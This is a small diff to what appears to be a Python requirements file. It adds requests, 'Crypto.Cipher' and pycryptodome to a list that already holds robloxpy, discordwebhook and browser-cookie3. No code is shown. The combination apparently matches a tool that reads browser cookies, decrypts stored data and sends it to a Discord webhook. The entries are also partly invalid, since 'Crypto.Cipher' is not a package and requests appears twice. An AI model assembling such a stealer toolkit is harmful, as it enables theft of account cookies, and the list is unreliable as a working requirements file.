@@ -21,3 +21,6 @@ robloxpy
 requests
 discordwebhook
 browser-cookie3
+requests
+Crypto.Cipher
+pycryptodome
